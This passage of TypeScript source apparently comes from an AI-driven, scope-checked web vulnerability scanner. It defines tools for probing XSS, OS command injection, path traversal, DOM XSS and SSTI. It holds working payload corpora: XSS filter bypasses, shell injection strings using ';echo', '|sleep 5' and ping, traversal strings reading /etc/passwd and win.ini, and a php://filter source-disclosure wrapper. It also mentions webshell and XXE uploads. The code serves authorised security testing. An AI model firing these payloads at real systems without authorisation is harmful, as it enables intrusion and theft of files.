      "Send a scoped raw HTTP request to probe a hypothesis (IDOR/auth/exposure). Uses the current login session. Records evidence; returns an evidenceId to cite in findings. The full response body is scanned for CONCRETE IMPACT (leaked /etc/passwd, private keys/secrets, command output like uid=…, cross-user data) and any hit is surfaced in `impact` — that is your effectMarker for a CONFIRMED finding. For an IDOR/BOLA test, pass `victimId` (the other user's id you requested) and `selfId` (your own id): if the response carries the victim's id but not yours, you get a cross-user impact hit = the IDOR is real. FILE UPLOAD: pass `files` (and optional `fields`) to send a correct multipart/form-data upload — the boundary/CRLF are built for you (do NOT hand-craft a multipart body in `body`). Each file has {name (the form field), filename, contentType?, and either `content` (text, e.g. an XXE SVG) or `base64` (binary/magic-byte polyglot)}. Use this to test upload attacks: XXE via an SVG DOCTYPE ENTITY, a webshell behind image magic bytes (e.g. GIF89a; then <?php…), a pickle/deserialization blob, extension/type-filter bypass. EVIDENCE LABEL — when you send the benign/baseline CONTROL for a finding (no payload, or a non-existent id; it MUST fail), pass kind:'negative_control'; attack requests are kind:'positive_replay' (the default). Labeling the control makes the control-fails + ≥2-positives discipline explicit in the evidence.",
      {
        method: z.string(),
        url: z.string(),
        headers: z.record(z.string()).optional(),
        body: z.string().optional(),
        note: z.string().optional(),
        kind: z
          .enum(["negative_control", "positive_replay"])
          .optional()
          .describe("evidence role: 'negative_control' = a benign/baseline request that MUST fail (no payload / non-existent id); 'positive_replay' (default) = an attack request that should succeed. Label the control so the evidence discipline is visible in the report/UI."),
        victimId: z.string().optional().describe("for IDOR: the other user's id you are requesting (cross-user impact check)"),
        selfId: z.string().optional().describe("for IDOR: your own session's id (so your own data isn't mistaken for cross-user access)"),
        fields: z.record(z.string()).optional().describe("form fields to send alongside file(s) in a multipart upload"),
        files: z
          .array(z.object({ name: z.string(), filename: z.string(), contentType: z.string().optional(), content: z.string().optional(), base64: z.string().optional() }))
          .optional()
          .describe("file part(s) for a multipart upload; each has a text `content` OR binary `base64`"),
      },
      async ({ method, url, headers, body, note, kind, victimId, selfId, fields, files }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        const multipart =
          files && files.length
            ? {
                ...(fields ? { fields } : {}),
                files: files.map((f) => ({
                  name: f.name,
                  filename: f.filename,
                  ...(f.contentType ? { contentType: f.contentType } : {}),
                  base64: f.base64 ?? Buffer.from(f.content ?? "", "utf8").toString("base64"),
                })),
              }
            : undefined;
        const req: HttpRequest = {
          method: method.toUpperCase(),
          url,
          headers: { ...authHeaders(s), ...(headers ?? {}) },
          body: multipart ? null : body ?? null,
          ...(multipart ? { multipart } : {}),
        };
        let res: HttpResponse;
        try {
          res = await s.http.send(req);
          bumpHttp(s, res.status);
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 200)}`);
        }
        // multipart is binary, so keep a human-readable summary (fields + a preview of file contents) as evidence.
        const evBody = multipart
          ? `[multipart/form-data]\nfields: ${JSON.stringify(fields ?? {})}\n` +
            (files ?? []).map((f) => `file "${f.name}" filename="${f.filename}" (${f.contentType ?? "?"}):\n${(f.content ?? `<base64 ${f.base64?.length ?? 0}B>`).slice(0, 1500)}`).join("\n---\n")
          : req.body;
        const ev = s.evidence.record({
          screenId: s.currentScreenId ?? "pilot",
          validator: "claude-pilot",
          kind: kind ?? "positive_replay",
          request: { ...req, headers: s.http.effectiveHeaders(req.headers), body: evBody }, // keep all sent headers as evidence
          response: res,
          note: note ?? `${req.method} ${url} as ${s.currentRole || "unauth"}`,
        });
        // impact oracle: scan the full response (before the 1800 truncation). A hit becomes the effectMarker for a CONFIRMED finding.
        const impact = impactOracle(res.body, {
          ...(victimId ? { requestedIdentity: victimId } : {}),
          ...(selfId ? { sessionIdentity: selfId } : {}),
        });
        return txt(
          JSON.stringify({
            evidenceId: ev.id,
            status: res.status,
            headers: pick(res.headers, ["content-type", "location", "set-cookie", "www-authenticate", "access-control-allow-origin"]),
            bodyLength: res.body.length,
            ...(impact.length
              ? {
                  impact: impact.map((i) => ({ kind: i.kind, severity: i.severity, marker: i.marker, detail: i.detail })),
                  impactHint: `CONCRETE IMPACT detected — to CONFIRM, re-send a negative control (this impact ABSENT) + this request again, then record_finding citing these evidenceIds with effectMarker="${impact[0]!.marker}".`,
                }
              : {}),
            body: res.body.slice(0, 1800),
          }),
        );
      },
    ),
    tool(
      "login",
      "Log in as one of the provided roles to reach authenticated surface. Updates the browser + http session to that role.",
      { role: z.string() },
      async ({ role }) => {
        const desc = s.roleDescriptions.get(role);
        const tag = desc ? ` [${desc}]` : ""; // attach the privilege description (if any) to the response
        // ⓪ attended (manual multi-session): each role already has a live context.
        //    Don't re-login; just swap the active driver / cookie to that role.
        const live = s.roleSessions?.get(role);
        if (live) {
          s.driver = live.driver;
          const fresh = await live.driver.sessionCookieHeader().catch(() => live.cookie);
          if (fresh) live.cookie = fresh;
          s.currentCookie = live.cookie;
          s.currentBearer = (await live.driver.bearerToken().catch(() => null)) ?? "";
          s.currentRole = role;
          return txt(`switched to live attended session for role '${role}'${tag} (manual login; cookie ${live.cookie ? "present" : "empty"}${s.currentBearer ? ", bearer present" : ""}).`);
        }
        // ① If there's a pre-captured Cookie file, inject it without logging in (for walls that can't be auto-logged-in).
        const cookieFile = s.roleCookieFiles.get(role);
        if (cookieFile) {
          try {
            const loaded = loadCookieFile(cookieFile, s.targetUrl);
            if (!loaded.header && !loaded.bearer && loaded.origins.length === 0) {
              return txt(`cookie file for '${role}' is empty/unparseable: ${cookieFile}`);
            }
            await s.driver.clearSession();
            const applied = await applyLoadedAuth(s.driver, loaded, s.targetUrl);
            s.currentCookie = applied.cookie;
            s.currentBearer = applied.bearer;
            s.currentRole = role;
            const bits = [
              loaded.browserCookies.length ? `${loaded.browserCookies.length} cookie(s)` : "",
              loaded.origins.length ? `${loaded.origins.reduce((n, o) => n + o.localStorage.length, 0)} localStorage key(s)` : "",
              applied.bearer ? "bearer present" : "",
            ].filter(Boolean);
            return txt(`role '${role}'${tag}: injected ${bits.join(", ") || "session"} from file (no login).`);
          } catch (e) {
            return txt(`cookie file error for '${role}': ${String(e).slice(0, 150)}`);
          }
        }
        // ② smartLogin with credentials.
        const creds = s.roleCreds.get(role);
        if (!creds) {
          const avail = availableRoles(s).map((r) => (r.description ? `${r.name} (${r.description})` : r.name)).join(", ") || "none";
          return txt(`no credentials/cookie for '${role}'. Available roles: ${avail}`);
        }
        try {
          await s.driver.clearSession();
          const r = await smartLogin(s.driver, s.loginLlm, creds, {
            targetUrl: s.targetUrl,
            ...(s.roleLoginUrls?.get(role) ? { loginScreenUrl: s.roleLoginUrls.get(role)! } : {}),
            ...(s.model ? { model: s.model } : {}),
          });
          if (r.ok) {
            s.currentCookie = await s.driver.sessionCookieHeader();
            s.currentBearer = (await s.driver.bearerToken().catch(() => null)) ?? "";
            s.currentRole = role;
            return txt(`logged in as '${role}'${tag}; now at ${s.driver.currentUrl()}${s.currentBearer ? " (bearer JWT captured)" : ""}`);
          }
          return txt(`login as '${role}' did not complete: ${r.reason}`);
        } catch (e) {
          return txt(`login error: ${String(e).slice(0, 200)}`);
        }
      },
    ),
    tool(
      "probe_xss",
      "Confirm REFLECTED XSS, iterating a FILTER-BYPASS corpus (not a single fixed payload). Injects into `param` (or a `body` with {{XSS}}) and checks whether an active tag/handler survives UNESCAPED in the response. Tries ~10 ranked bypasses (direct tag, attribute breakout, case-mix, broken/slash-separated tags, svg/iframe/details/body vectors, onfocus/ontoggle/onerror handlers). CRUCIAL: if a benign marker reflects but the payloads are stripped/escaped, that is 'FILTER PRESENT — keep going', NOT clean. On a survivor it confirms with control + 2 replays and returns negativeControl + positiveReplays + the effectMarker + which bypass worked → record_finding(category xss-reflected). If nothing survives but input reflects, use probe_dom_xss (client-side sink).",
      { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
      async ({ url, param, method, body }) => {
        const tok = `xZ${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
        const buildReq = (val: string): HttpRequest | null => {
          let u = url;
          let b: string | null = null;
          if (body != null) b = body.replace(/\{\{XSS\}\}/g, val);
          else if (param) {
            try {
              const uu = new URL(url);
              uu.searchParams.set(param, val);
              u = uu.toString();
            } catch {
              return null;
            }
          }
          if (!isInScope(u, s.scope)) return null;
          return { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: authHeaders(s), body: b };
        };
        const rawSend = async (val: string): Promise<{ status: number; body: string; html: boolean } | null> => {
          const req = buildReq(val);
          if (!req) return null;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          return { status: res.status, body: res.body, html: /html/i.test(res.headers["content-type"] ?? "") };
        };
        const recordSend = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const req = buildReq(val)!;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-xss", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `xss ${tag}` });
          return { evId: ev.id, status: res.status, body: res.body };
        };
        // Each payload's marker = a deterministic substring (real <>/handler) that appears in the response only when it survives unescaped.
        const corpus = [
          { name: "img-onerror", payload: `<img src=x onerror=alert('${tok}')>`, marker: `<img src=x onerror=alert('${tok}')>` },
          { name: "attr-break-svg", payload: `"><svg onload=alert('${tok}')>`, marker: `<svg onload=alert('${tok}')>` },
          { name: "case-mix", payload: `<ImG sRc=x OnErRoR=alert('${tok}')>`, marker: `<ImG sRc=x OnErRoR=alert('${tok}')>` },
          { name: "svg-slash", payload: `<svg/onload=alert('${tok}')>`, marker: `<svg/onload=alert('${tok}')` },
          { name: "details-toggle", payload: `<details open ontoggle=alert('${tok}')>`, marker: `<details open ontoggle=alert('${tok}')` },
          { name: "body-onload", payload: `<body onload=alert('${tok}')>`, marker: `<body onload=alert('${tok}')` },
          { name: "iframe-js", payload: `<iframe src=javascript:alert('${tok}')>`, marker: `<iframe src=javascript:alert('${tok}')` },
          { name: "input-autofocus", payload: `"><input autofocus onfocus=alert('${tok}')>`, marker: `<input autofocus onfocus=alert('${tok}')` },
          { name: "img-slash-sep", payload: `<img/src=x/onerror=alert('${tok}')>`, marker: `<img/src=x/onerror=alert('${tok}')` },
          { name: "svg-comment", payload: `<svg onload=alert(1)//${tok}>`, marker: `<svg onload=alert(1)//${tok}` },
        ];
        const benignMarker = `xssbenign${tok}`;
        let benign: Awaited<ReturnType<typeof rawSend>>;
        try {
          benign = await rawSend(benignMarker);
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
        if (!benign) return txt("ERROR: bad url/param — pass url+param or a body with {{XSS}}.");
        const reflected = benign.body.includes(benignMarker);
        // ── filter-bypass corpus iteration ── look for a payload that survives (one at a time).
        let winner: (typeof corpus)[number] | null = null;
        let htmlCtx = false;
        const tried: string[] = [];
        for (const c of corpus) {
          let r: Awaited<ReturnType<typeof rawSend>>;
          try {
            r = await rawSend(c.payload);
          } catch {
            continue;
          }
          if (!r) continue;
          tried.push(c.name);
          // Survivor = the payload's tag reflects UNESCAPED in a LIVE HTML position, on an HTML response — NOT inside a
          // <script>/RCDATA/comment (inert), and NOT in a JSON/text response (browsers don't parse it as HTML).
          // reflectionIsLive enforces the position; r.html enforces the content-type.
          if (r.status < 500 && r.html && reflectionIsLive(r.body, c.marker)) {
            winner = c;
            htmlCtx = r.html;
            break;
          }
        }
        if (!winner)
          return txt(
            JSON.stringify({
              reflected,
              triedBypasses: tried.length,
              verdict: reflected
                ? `FILTER PRESENT (NOT clean): the input reflects but all ${tried.length} tag/handler bypasses were neutralized. Do NOT mark xss clean on this alone — run probe_dom_xss (client-side/DOM sink), and if the reflection lands in a specific context (JS string / attribute) craft a targeted payload via http_request.`
                : `input not reflected in the response body — not a server-reflection XSS sink. For a client-rendered/SPA route use probe_dom_xss (browser execution).`,
            }),
          );
        // ── confirm the surviving payload with control + 2 replays (marker-based) ──
        const ctrl = await recordSend(benignMarker, "negative_control", "control(benign)");
        const w1 = await recordSend(winner.payload, "positive_replay", `bypass ${winner.name} #1`);
        const w2 = await recordSend(winner.payload, "positive_replay", `bypass ${winner.name} #2`);
        const verdict = checkLogicEvidence(
          { status: ctrl.status, hasMarker: reflectionIsLive(ctrl.body, winner.marker) },
          [w1, w2].map((p) => ({ status: p.status, hasMarker: reflectionIsLive(p.body, winner!.marker) })),
          { requireSuccess: false }, // XSS reflects on a 4xx error page too — the marker confirms it, not the status
        );
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [w1.evId, w2.evId],
            effectMarker: winner.marker,
            bypass: winner.name,
            htmlResponse: htmlCtx,
            verdict: verdict.ok
              ? `REFLECTED XSS CONFIRMED via the "${winner.name}" bypass — the payload reflected UNESCAPED. record_finding(category xss-reflected) with these evidenceIds + effectMarker.${htmlCtx ? "" : " (Response is not html content-type — confirm browser execution with probe_dom_xss before relying on it.)"}`
              : `not confirmed on replay: ${(verdict as { reason: string }).reason}`,
          }),
        );
      },
    ),
    tool(
      "probe_cmdi",
      "Confirm OS COMMAND INJECTION — output-based AND time-based (BLIND). Inject into `param` or a `body` with {{CMD}} — OR aim any other location with `location`: \"header:User-Agent\" / \"cookie:sid\" / \"path:-1\" / \"json:/host\" (+ `contentType` so a JSON API parses the body). Output-based: injects shell payloads (separators ; | && , command-substitution $() and backticks) that compute an ARITHMETIC PRODUCT of two random numbers; if the response contains the PRODUCT (not the literal expression), the shell evaluated it = injection (distinguishes execution from echo, like SSTI). Time-based: injects sleep 5 / ping payloads and confirms a consistent ~5s DELAY vs a fast baseline (for the blind case with no output — works from ANY location). Returns negativeControl + positiveReplays evidenceIds + the technique → record_finding(category rce). USE on any value that could reach a shell: ping/host/dns tools, filename/path handed to a converter, export/format, git/curl wrappers.",
      { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional(), location: z.string().optional(), contentType: z.string().optional() },
      async ({ url, param, method, body, location, contentType }) => {
        const buildReq = (val: string): HttpRequest | null => {
          let req: HttpRequest;
          if (location) {
            const loc = parseLocation(location);
            if (!loc) return null;
            const base: HttpRequest = { method: (method ?? (loc.kind === "json" || body != null ? "POST" : "GET")).toUpperCase(), url, headers: authHeaders(s), body: body ?? null };
            const placed = placePayload(base, loc, val, contentType);
            if (!placed) return null;
            req = placed;
          } else {
            let u = url;
            let b: string | null = null;
            if (body != null) b = body.replace(/\{\{CMD\}\}/g, val);
            else if (param) {
              try {
                const uu = new URL(url);
                uu.searchParams.set(param, val);
                u = uu.toString();
              } catch {
                return null;
              }
            }
            const hdrs = authHeaders(s);
            if (contentType && body != null) hdrs["content-type"] = contentType;
            req = { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: hdrs, body: b };
          }
          if (!isInScope(req.url, s.scope)) return null;
          return req;
        };
        const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string, overrideBody?: string) => {
          const req = buildReq(val);
          if (!req) return null;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-cmdi",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: overrideBody != null ? { ...res, body: overrideBody } : res,
            note: `cmdi ${tag}`,
          });
          return { evId: ev.id, status: res.status, body: res.body, ms: res.durationMs };
        };
        const rawSend = async (val: string): Promise<{ status: number; body: string; ms: number } | null> => {
          const req = buildReq(val);
          if (!req) return null;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          return { status: res.status, body: res.body, ms: res.durationMs };
        };
        try {
          const a = 3000 + Math.floor(Math.random() * 6000);
          const b = 3000 + Math.floor(Math.random() * 6000);
          const product = String(a * b); // appears in the response only when executed (the literal doesn't contain the product)
          const arith = `$((${a}*${b}))`;
          const outPayloads = [arith, `;echo ${arith};`, `|echo ${arith}`, `$(expr ${a} \\* ${b})`, "`expr " + a + " \\* " + b + "`", `&&echo ${arith}`, `%0aecho ${arith}%0a`];
          const benign = await rawSend("1");
          if (!benign) return txt("ERROR: bad url/param — pass url+param or a body with {{CMD}}.");
          // ── output-based (arithmetic-product marker) ──
          for (const p of outPayloads) {
            const r = await rawSend(p);
            if (!r || r.status >= 500) continue;
            if (r.body.includes(product) && !benign.body.includes(product)) {
              // Re-verify on TWO fresh sends and record the REAL responses. A single echo can be a flaky / load-balanced
              // hit; the old code fabricated the ×2 "replays" from a CONSTANT proof string, so record_finding's stability
              // gate passed by construction. Require BOTH real replays to actually carry the product (baseline absent).
              const ctl = await send("1", "negative_control", "out baseline");
              const p1 = await send(p, "positive_replay", "out#1");
              const p2 = await send(p, "positive_replay", "out#2");
              if (ctl && p1 && p2 && p1.body.includes(product) && p2.body.includes(product) && !ctl.body.includes(product))
                return txt(JSON.stringify({ technique: "output-based", negativeControl: ctl.evId, positiveReplays: [p1.evId, p2.evId], effectMarker: product, verdict: `OS COMMAND INJECTION CONFIRMED (output): payload ${p} → shell computed ${product}, present in 2 STABLE replays (baseline absent). record_finding(category rce, critical) with these evidenceIds.` }));
              continue; // single/flaky echo not reproduced on replay → not a reliable injection; try the next payload
            }
          }
          // ── time-based (blind) ──
          const baselineMs = Math.min(benign.ms, (await rawSend("1"))?.ms ?? benign.ms);
          for (const sp of [";sleep 5;", "|sleep 5", "$(sleep 5)", "&&sleep 5", "%0asleep 5%0a", "&ping -n 5 127.0.0.1", "|ping -c 5 127.0.0.1"]) {
            const r = await rawSend(sp);
            if (!r || r.ms < baselineMs + 4000) continue;
            const r2 = await rawSend(sp);
            if (r2 && r2.ms >= baselineMs + 4000) {
              const proof = `BLIND COMMAND INJECTION CONFIRMED (time-based) — payload="${sp}" baseline=${baselineMs}ms observed=${r.ms}ms and ${r2.ms}ms (delta +${r.ms - baselineMs}ms, x2 stable). No output: the DELAY is the proof.`;
              const p1 = await send(sp, "positive_replay", "time-proof#1", proof);
              const p2 = await send(sp, "positive_replay", "time-proof#2", proof);
              const ctl = await send("1", "negative_control", "time baseline-proof", `baseline ${baselineMs}ms — no injection, fast response.`);
              if (p1 && p2 && ctl)
                return txt(JSON.stringify({ technique: "time-based", negativeControl: ctl.evId, positiveReplays: [p1.evId, p2.evId], verdict: `BLIND OS COMMAND INJECTION CONFIRMED (time-based): ${sp} added ~${r.ms - baselineMs}ms x2 vs ${baselineMs}ms baseline. record_finding(category rce, critical) with these evidenceIds.` }));
            }
          }
          return txt(JSON.stringify({ technique: null, verdict: "not confirmed: no product echo and no time delay across separator/substitution payloads. If a URL/host param, also try probe_oob (blind CMDi via a DNS/HTTP callback)." }));
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_traversal",
      "Confirm PATH TRAVERSAL / LFI: reads a file outside the intended directory through a file/path param (download/view/include/template/image/lang/file=). Inject via a {{PATH}} placeholder or `param`. Iterates a bypass corpus (../ traversal, ....// filter-defeat, URL/double-encoded, absolute path, null byte, Windows ..\\, and the PHP filter wrapper for source disclosure). Confirms via the impact oracle — the response carries real file content (/etc/passwd root:x:0:0, win.ini, or base64 source) that a benign control does not. Returns negativeControl + positiveReplays evidenceIds + the effectMarker → record_finding(category path-traversal).",
      { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
      async ({ url, param, method, body }) => {
        const buildReq = (val: string): HttpRequest | null => {
          let u = url;
          let b: string | null = null;
          if (body != null) b = body.replace(/\{\{PATH\}\}/g, val);
          else if (param) {
            try {
              const uu = new URL(url);
              uu.searchParams.set(param, val);
              u = uu.toString();
            } catch {
              return null;
            }
          } else if (url.includes("{{PATH}}")) u = url.replace(/\{\{PATH\}\}/g, encodeURIComponent(val));
          else return null;
          if (!isInScope(u, s.scope)) return null;
          return { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: authHeaders(s), body: b };
        };
        const rawSend = async (val: string): Promise<{ status: number; body: string } | null> => {
          const req = buildReq(val);
          if (!req) return null;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          return { status: res.status, body: res.body };
        };
        const recordSend = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const req = buildReq(val)!;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-traversal", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `traversal ${tag}` });
          return { evId: ev.id, status: res.status, body: res.body };
        };
        const corpus = [
          "../../../../../../etc/passwd",
          "....//....//....//....//etc/passwd",
          "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
          "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "/etc/passwd",
          "../../../../../../etc/passwd%00",
          "..\\..\\..\\..\\windows\\win.ini",
          "php://filter/convert.base64-encode/resource=index.php",
        ];
        try {
          const benign = await rawSend("index.html");
          if (!benign) return txt("ERROR: bad url/param — pass a {{PATH}} placeholder or a param.");
          for (const p of corpus) {
            const r = await rawSend(p);
            if (!r) continue;
            const impact = impactOracle(r.body, { baselineBody: benign.body });
            const fileHit = impact.find((i) => i.kind === "file-leak" || i.kind === "source-leak");
            if (fileHit && r.status < 500) {
              const ctrl = await recordSend("index.html", "negative_control", "benign(no traversal)");
              const w1 = await recordSend(p, "positive_replay", `traversal #1 ${p}`);
              const w2 = await recordSend(p, "positive_replay", `traversal #2 ${p}`);
              const verdict = checkEvidenceDiscipline(
                { status: ctrl.status, bodyLen: ctrl.body.length },
                [w1, w2].map((x) => ({ status: x.status, bodyLen: x.body.length })),
              );
              return txt(
                JSON.stringify({
                  negativeControl: ctrl.evId,
                  positiveReplays: [w1.evId, w2.evId],
                  effectMarker: fileHit.marker,
                  payload: p,
                  verdict: verdict.ok
                    ? `PATH TRAVERSAL / LFI CONFIRMED — payload "${p}" leaked ${fileHit.kind} (${fileHit.marker}); benign control did not. record_finding(category path-traversal) with these evidenceIds + effectMarker.`
                    : `file content leaked but replay evidence weak: ${(verdict as { reason: string }).reason} — re-check stability.`,
                }),
              );
            }
          }
          return txt(JSON.stringify({ verdict: "not confirmed: no file content leaked across ../, encoded, null-byte, Windows, or php-filter payloads. If the param is reflected into a template/include, also consider LFI-to-RCE via a log/wrapper, or probe_oob for a remote include." }));
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_dom_xss",
      "Confirm DOM-based / innerHTML-sink XSS by ACTUAL BROWSER EXECUTION — what probe_xss CANNOT see (probe_xss only checks HTTP-response reflection, so it misses client-rendered SPA sinks: a search box that renders `q` into innerHTML, e.g. Juice Shop `#/search?q=`, returns JSON/SPA-shell from the server and executes only in the browser). Navigates a real browser to the injection point with an executing payload and reports whether it RAN. Pass `url` with a `{{XSS}}` placeholder at the injection point (best — also works for hash routes), or `url` + `param` (the query/hash param to inject). Sends a benign control (no payload) + the payload twice; returns negativeControl + positiveReplays evidenceIds + effectMarker, ready for record_finding(category xss-reflected). USE THIS whenever probe_xss came back 'reflected but NOT html' / 'not confirmed' on a client-rendered or SPA route.",
      { url: z.string(), param: z.string().optional() },
      async ({ url, param }) => {
        const tok = `domX${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
        s.xssProof = undefined; // reset any stale proof from a previous probe
        // On execution (img.onerror fires when the SPA inserts this via innerHTML): (1) set window.__verdict_xss=tok,
        // (2) inject a big fixed banner so the evidence SCREENSHOT visibly proves the XSS fired (not just a subtle
        // rendered tag), (3) fire alert (an extra detection signal). All strings single-quoted (attribute is double-quoted).
        const banner = `(function(){try{var d=document.createElement('div');d.id='verdict-xss';d.textContent='VERDICT · DOM-XSS EXECUTED · ${tok}';d.setAttribute('style','position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c0392b;color:#fff;font:700 20px/1.5 system-ui,-apple-system,sans-serif;padding:16px 20px;text-align:center;letter-spacing:.3px;box-shadow:0 3px 14px rgba(0,0,0,.6)');(document.body||document.documentElement).appendChild(d);}catch(e){}})()`;
        const payload = `"><img src=x onerror="window.__verdict_xss='${tok}';${banner};alert('${tok}')">`;
        const benign = `verdict${tok}safe`;
        const buildUrl = (val: string): string | null => {
          try {
            if (url.includes("{{XSS}}")) return url.replace(/\{\{XSS\}\}/g, encodeURIComponent(val));
            if (!param) return null;
            // Hash-route support: if there's a '#…', inject into the hash-side query (the URL API doesn't touch inside the hash, so build it by hand).
            const hashAt = url.indexOf("#");
            if (hashAt >= 0) {
              const base = url.slice(0, hashAt);
              let hash = url.slice(hashAt); // e.g. '#/search?q=…'
              const enc = `${encodeURIComponent(param)}=${encodeURIComponent(val)}`;
              const re = new RegExp(`([?&]${param}=)[^&]*`);
              if (hash.includes("?")) hash = re.test(hash) ? hash.replace(re, `$1${encodeURIComponent(val)}`) : `${hash}&${enc}`;
              else hash = `${hash}?${enc}`;
              return base + hash;
            }
            const uu = new URL(url);
            uu.searchParams.set(param, val);
            return uu.toString();
          } catch {
            return null;
          }
        };
        const run = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const u = buildUrl(val);
          if (!u) return null;
          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
          const r = await s.driver.detectXssExecution(u, tok);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-dom-xss",
            kind,
            request: { method: "GET", url: u, headers: {}, body: null },
            // Encode the execution result into the body (contains tok when executed) → so it passes record_finding's marker gate.
            response: { status: 200, finalUrl: u, durationMs: 0, headers: { "content-type": "text/html" }, body: r.executed ? `${r.signal} [${tok}]` : r.signal },
            note: `dom-xss ${tag}`,
          });
          return { evId: ev.id, executed: r.executed, signal: r.signal };
        };
        let ctrl: Awaited<ReturnType<typeof run>>;
        let p1: Awaited<ReturnType<typeof run>>;
        let p2: Awaited<ReturnType<typeof run>>;
        try {
          ctrl = await run(benign, "negative_control", "control(benign, no payload)");
          p1 = await run(payload, "positive_replay", "payload #1");
          p2 = await run(payload, "positive_replay", "payload #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
        if (!ctrl || !p1 || !p2) return txt("ERROR: could not build injection URL — pass url with a {{XSS}} placeholder, or url + param.");
        // Proof screenshot: p2 was the last run, so the browser is still on the XSS'd page with the injected banner
        // visible. Capture it now → record_finding will use THIS (the execution moment) for the finding screenshot.
        if (p2.executed || p1.executed) {
          try {
            const rel = `findings/_xssproof-${tok}.png`;
            if (await s.driver.saveScreenshot(join(s.artifactsDir, rel))) s.xssProof = { rel, at: Date.now() };
          } catch {
            /* best-effort — the finding still records, just without the fire-time shot */
          }
        }
        const confirmed = !ctrl.executed && p1.executed && p2.executed;
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            effectMarker: tok,
            control: { executed: ctrl.executed },
            payload: [{ executed: p1.executed, signal: p1.signal }, { executed: p2.executed, signal: p2.signal }],
            verdict: confirmed
              ? "DOM XSS CONFIRMED — payload EXECUTED in the browser (control did not). record_finding(xss-reflected) with these evidenceIds + effectMarker."
              : ctrl.executed
                ? "inconclusive: the benign control also 'executed' — detection is unreliable here, do not record."
                : "not confirmed: payload did not execute in the browser (the sink escapes it or is not a live DOM sink).",
          }),
        );
      },
    ),
    tool(
      "probe_ssti",
      "Confirm SERVER-SIDE TEMPLATE INJECTION (SSTI). Injects a polyglot arithmetic template payload into `param` (or a `body` with {{SSTI}}) and checks whether the server EVALUATES it — i.e. the response contains the COMPUTED PRODUCT, not the literal payload. Sends a benign non-template control (the product must be absent) + the template payload twice (the product must appear, stable). Covers Jinja2/Twig/Nunjucks `{{}}`, FreeMarker/JSP-EL/Thymeleaf `${}`, `#{}`, and ERB `<%= %>`. Returns negativeControl + positiveReplays evidenceIds + the effectMarker (the product), ready for record_finding(category ssti). IMPORTANT: HTML autoescaping refutes XSS but NOT SSTI — run this whenever a param is reflected into a server-rendered response, especially after probe_xss reports 'reflected but escaped' / 'not html'. SSTI is typically RCE-class — set severity high+ on confirm.",
      { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
      async ({ url, param, method, body }) => {
        const tok = `sZ${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
        // An 8-digit product unlikely to collide. Literal reflection just returns the payload string (no product) → if evaluated, the product appears.
        const a = 8000 + Math.floor(Math.random() * 1000);
        const b = 8000 + Math.floor(Math.random() * 1000);
        const product = String(a * b);
        // A multi-language polyglot. If any one engine evaluates it, the product appears in the response.
        const payload = `{{${a}*${b}}}\${${a}*${b}}#{${a}*${b}}<%=${a}*${b}%>`;
        const control = `amrSSTI${tok}`; // no template syntax → can't be evaluated (the product will never appear)
        const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
          let u = url;
          let b2: string | null = null;
          if (body != null) b2 = body.replace(/\{\{SSTI\}\}/g, val);
          else if (param) {
            try {
              const uu = new URL(url);
              uu.searchParams.set(param, val);
              u = uu.toString();
            } catch {
              return null;
            }
          }
          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
          const req: HttpRequest = { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: authHeaders(s), body: b2 };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-ssti",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `ssti ${tag} ${param ?? "body"}`,
          });
          // hasMarker = whether the evaluation result (the product) appears in the response. False if only the payload literal is returned.
